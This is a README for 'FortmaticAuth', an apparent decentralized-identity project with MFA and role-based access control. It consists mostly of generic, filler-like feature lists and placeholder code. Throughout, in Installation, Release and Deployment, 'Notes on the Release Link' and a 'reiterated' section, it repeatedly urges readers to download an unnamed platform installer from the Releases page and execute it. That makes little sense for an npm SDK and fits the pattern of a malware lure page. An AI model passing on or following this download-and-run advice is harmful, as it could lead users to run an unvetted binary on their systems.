[![Releases](https://img.shields.io/github/v/release/NghiaTZ/FortmaticAuth?logo=github&style=for-the-badge)](https://github.com/NghiaTZ/FortmaticAuth/releases)

# FortmaticAuth: Decentralized Identity with MFA and RBAC Gateway

A secure platform for managing decentralized identities. FortmaticAuth combines multi-factor verification with a role-based access gateway to protect digital spaces and data. It is designed to work across apps, services, and networks, letting teams verify users with multiple factors while enforcing permissions through a clear RBAC model. This README covers the core concepts, setup, usage patterns, and future directions. For the latest release assets, visit the Releases page linked above.

![Decentralized Identity](https://upload.wikimedia.org/wikipedia/commons/3/34/Decentralized_identity.svg)

Topics: not provided

Table of Contents
- Overview
- Core Concepts
- Features
- How FortmaticAuth Works
- Architecture and Design
- Getting Started
- Quick Start: Example Flows
- SDKs and APIs
- Security and Privacy
- Identity and MFA: How It Fits Together
- RBAC and Access Gate
- Integrations and Extensibility
- Testing and Quality
- Release and Deployment
- Roadmap
- Contributing
- Community and Support
- FAQ
- Credits and Acknowledgments

Overview
FortmaticAuth is built to ease the burden of proving who a user is while controlling what they can do. It merges decentralized identity principles with practical controls. The MFA layer ensures that identity verification includes something the user knows, has, or is. The RBAC gateway applies fine-grained permissions to protect resources and actions in apps, services, and infrastructure. The aim is to provide a cohesive, scalable foundation for secure access across ecosystems.

Core Concepts
- Decentralized Identity (DID): A self-sovereign identity model where users own and control their identity data.
- Multi-Factor Verification (MFA): A layered approach to authentication that reduces risk by requiring multiple proofs.
- Role-Based Access Control (RBAC): A formal model that assigns permissions based on user roles.
- Access Gateway: A policy layer that gates actions and resources according to roles and verification status.
- Agent/Provider Abstraction: A pluggable set of modules for identity verification, credential issuance, and access decisions.

Features
- Flexible identity models: support for DID-based identities, Verifiable Credentials, and portable user profiles.
- Strong MFA options: time-based one-time passwords (TOTP), WebAuthn hardware keys, push notifications, and biometric prompts where available.
- RBAC-based access: define roles, permissions, and inheritance to enforce access rules.
- Secure session management: short-lived tokens, rotation, and revocation capabilities.
- Portable data: identity data that can be used across apps without lock-in.
- Extensible architecture: plug in additional verification methods, credential types, or gate policies.
- Observability: built-in logging, auditing, and telemetry hooks for governance and compliance.

How FortmaticAuth Works
- Identity creation: A user creates an identity or imports an existing one. Credentials are bound to the user and can be backed by decentralized data stores or verifiable credentials.
- MFA enrollment: The user selects MFA methods. The system registers those methods and enforces them on sign-in or sensitive actions.
- Verification flow: On authentication, the user proves possession of the required factors. The system validates the proofs and issues a session token.
- Access evaluation: When a user requests an action, the RBAC gateway checks the user’s roles and permissions against the action. If allowed, the request proceeds; otherwise, it is denied.
- Credential usage: Apps consume tokens and validate claims to enforce policy. Verifiable Credentials can be used to prove attributes or entitlements without revealing unnecessary data.
- Lifecycle management: Identities, MFA methods, and roles can be updated, rotated, or revoked. Audit trails capture changes for compliance.

Architecture and Design
- Modular layers: identity layer, MFA layer, and access-gate layer. Each layer exposes a clean API and can be replaced with equivalents without breaking the whole system.
- Pluggable providers: authentication methods, key management, and policy evaluators are replaceable modules.
- Secure storage: sensitive data is protected at rest and in transit. Secrets are stored in protected vaults or secure enclaves.
- Interoperability: designed to work with browsers, mobile apps, and server-side components through SDKs and REST APIs.
- Observability: standard logging, metrics, and tracing help you monitor behavior and diagnose issues.

Getting Started
Prerequisites
- Node.js v18+ or a compatible runtime for the SDKs (adjust to your stack)
- A modern package manager (npm, yarn, or pnpm)
- Access to a developer environment with network access to the identity services you plan to use

Installation
- Clone the repository
  - git clone https://github.com/NghiaTZ/FortmaticAuth.git
- Install dependencies
  - cd FortmaticAuth
  - npm install
- Build or install from release assets
  - For local development:
    - npm run build
  - From the releases page, download the installer asset for your platform and execute it.
      From the releases page, download the installer asset for your platform and execute it.
  - The Releases page can be accessed at https://github.com/NghiaTZ/FortmaticAuth/releases

Configuration
- Environment variables
  - FORTMATICAUTH_API_BASE: base URL for API endpoints
  - FORTMATICAUTH_NETWORK: network name (e.g., mainnet, testnet)
  - FORTMATICAUTH_MFA_PROVIDER: default MFA provider (e.g., TOTP, WebAuthn)
  - FORTMATICAUTH_ROLE_MAP: JSON mapping of roles to permissions
- Client settings
  - apiKey: a key issued by your FortmaticAuth deployment
  - issuerDid or didDocument: for DID-based identity scenarios
  - redirectUrls: after sign-in or verification flows
- Security considerations
  - Use TLS 1.2+ for all endpoints
  - Rotate keys regularly
  - Enable audit logging for sensitive actions

Usage Patterns
- Quick integration example (JavaScript)
  - This shows how a client app can interact with FortmaticAuth to authenticate a user and request access to a protected resource.
  - Code snippet:
    - // Initialize the auth client
    - const auth = new FortmaticAuth.Client({
    -   apiKey: "YOUR_API_KEY",
    -   network: "mainnet",
    -   mfProvider: "webauthn",
    - });
    - 
    - // Start login flow
    - const session = await auth.login({ username: "alice@example.com" });
    - 
    - // Check permissions for a resource
    - const allowed = await auth.checkAccess({
    -   userId: session.userId,
    -   resource: "/payments/submit",
    -   action: "POST",
    -   context: { tenant: "AcmeCorp" },
    - });
    - 
    - if (!allowed) {
    -   throw new Error("Access denied");
    - }
    - 
  - Notes:
    - Replace placeholders with real values from your deployment.
    - Use MFA prompts to verify identity before sensitive actions.
- TypeScript usage
  - The SDK provides types for identities, sessions, and access policies to help with robust applications.
  - Example:
    - import { FortmaticAuth } from "fortmatic-auth-sdk";
    - const client = new FortmaticAuth({ apiKey: "YOUR_API_KEY" });
    - const token = await client.authenticate({ did: "did:example:123" });
- Admin operations
  - Create roles and assign permissions
  - Enroll and rotate MFA methods for users
  - Revoke credentials and enforce policy updates

SDKs and APIs
- REST API
  - Auth endpoints: /auth/login, /auth/verify, /auth/logout
  - Policy endpoints: /rbac/roles, /rbac/permissions, /rbac/mappings
  - DID and credentials: /did/resolve, /credentials/issue, /credentials/verify
- Client SDKs
  - JavaScript/TypeScript SDK
  - Mobile SDKs (iOS and Android)
  - Server SDKs for Node.js and other runtimes
- Data formats
  - JSON for requests and responses
  - Verifiable Credentials for portable claims
  - JWTs for tokens with short lifetimes and rotation

Security and Privacy
- Identity security
  - User-controlled identity data with minimal disclosure
  - Verifiable Credentials allow proving attributes without exposing all data
  - MFA reduces the risk of credential theft
- Data protection
  - Encryption at rest and in transit
  - Secrets and keys managed by secure vaults or hardware security modules
- Threat model
  - Potential attacks include credential replay, MFA fatigue, identity spoofing, and privilege escalation
  - FortmaticAuth mitigates these with multifactor checks, short-lived tokens, and strict RBAC
- Compliance considerations
  - Audit logging for access events
  - Data minimization practices
  - Privacy-by-design approaches in all modules

Identity and MFA: How It Fits Together
- DID-based identities provide user control over credentials
- MFA adds layers of verification at critical points
- The system binds roles to identities, enabling policy-driven access
- Verifiable Credentials enable portable proofs that can be shared with consent

RBAC and Access Gate
- Roles define what a user can do
- Permissions map to specific actions on resources
- The access gate enforces policies in real time
- Roles can inherit permissions to reduce duplication
- Policy changes take effect quickly to reflect new security postures

Integrations and Extensibility
- Plug in new MFA providers
  - Add a new factor type with a simple interface
  - Support for TOTP, WebAuthn, push, biometrics, and more
- Extend identity sources
  - Import external identities or connect to identity networks
- Policy customization
  - Create complex RBAC policies, including conditional access rules
- Platform compatibility
  - Works with web, mobile, and server environments
  - Lightweight SDKs for client apps and robust APIs for servers

Testing and Quality
- Unit tests for identity, MFA, and RBAC components
- Integration tests for end-to-end flows
- Property-based tests for policy evaluation
- Security testing: fuzzing, access control checks, and threat modeling exercises
- CI/CD
  - Automated builds and test runs on pull requests
  - Code coverage reports and static analysis

Release and Deployment
- Releases page
  - The project publishes binaries and installers on the official Releases page
  - From the releases page, download the installer asset for your platform and execute it
  - The Releases page can be accessed at https://github.com/NghiaTZ/FortmaticAuth/releases
- Deployment options
  - Self-hosted service implementing FortmaticAuth components
  - Managed service with hosted identity and policy services
- Upgrade path
  - Backward compatibility for identity data and credentials
  - Migration scripts for policy and RBAC changes
- Scaling considerations
  - Partition identity data by tenant or domain
  - Use caching for policy decisions to reduce latency
  - Separate MFA processing from core identity services to improve resilience

Roadmap
- Short-term (next 3 months)
  - Expand MFA method support and standardize on WebAuthn
  - Strengthen RBAC with attribute-based access controls (ABAC) options
  - Improve developer experience with richer code samples and tutorials
  - Add improved observability dashboards and alerting
- Medium-term (3–9 months)
  - Cross-device session synchronization and seamless revocation
  - Pluggable identity registries and DID resolver enhancements
  - More export/import options for credential data
- Long-term (12+ months)
  - Native wallet integration for DID management
  - Federated identity support with trust graphs
  - Plugin marketplace for community-driven extensions

Contributing
- How to contribute
  - Fork the repository, create a feature branch, and open a pull request
  - Follow the coding style and write tests for new features
  - Keep documentation updated with any API or behavior changes
- Code of conduct
  - We welcome respectful collaboration and clear communication
- Development setup
  - Install dependencies
  - Run local tests
  - Use mock services for offline development

Community and Support
- Community channels
  - GitHub Issues for bug reports and feature requests
  - Discussion forums for design decisions and best practices
- Documentation
  - This README is the primary source of information
  - Additional docs live in the docs directory (for deeper dives)
- Resources
  - Official guides, tutorials, and sample projects
  - Sample projects show how to integrate FortmaticAuth into web and mobile apps

FAQ
- What is FortmaticAuth?
  - A platform for decentralized identity with MFA and an RBAC gateway. It helps apps verify users and enforce permissions in a consistent way.
- How do I start?
  - Install from the releases page or build from source, configure your environment, and integrate the SDKs into your app.
- Is MFA required for all actions?
  - MFA policies can be configured per action. You can require MFA for sensitive actions or for elevated permissions.
- How do I manage roles?
  - Roles and permissions are defined in the policy module. You assign roles to users or groups and define what each role can do.
- Where can I find the latest release?
  - The Releases page contains the latest installers and assets. See the link at the top of this README and the Releases section below.

Credits and Acknowledgments
- Authors and contributors
  - Core architects, security researchers, and community contributors who helped shape the project.
- Open source dependencies
  - FortmaticAuth relies on a set of open source libraries and standards to ensure interoperability and security.
- Special thanks
  - The community that provides feedback, bug reports, and feature ideas that guide development.

Images and Visuals
- Decentralized Identity concept image
  - ![Decentralized Identity](https://upload.wikimedia.org/wikipedia/commons/3/34/Decentralized_identity.svg)
- Identity and security icons
  - ![Key Icon](https://upload.wikimedia.org/wikipedia/commons/6/6f/Key-Svgrepo-com.svg)
- Architecture sketch
  - A simple diagram illustrating the identity layer, MFA layer, and RBAC gateway can be created using your preferred diagram tool and included in the docs folder (e.g., docs/architecture.png)

Notes on the Release Link
- The URL provided includes a path to the releases section. From that page, you should download the installer asset appropriate for your platform and execute it to install FortmaticAuth on your environment. The correct steps are to locate the asset, download it, and run the installer. The link to access this area is https://github.com/NghiaTZ/FortmaticAuth/releases, and you will encounter assets that enable installation on your system.

Releases and Asset Download (reiterated)
- For the latest builds and installers, visit the Releases page: https://github.com/NghiaTZ/FortmaticAuth/releases
- From the releases page, download the installer asset for your platform and execute it.
- After installation, follow the quick start steps in this README to connect your application to FortmaticAuth and begin implementing MFA and RBAC.

End of README
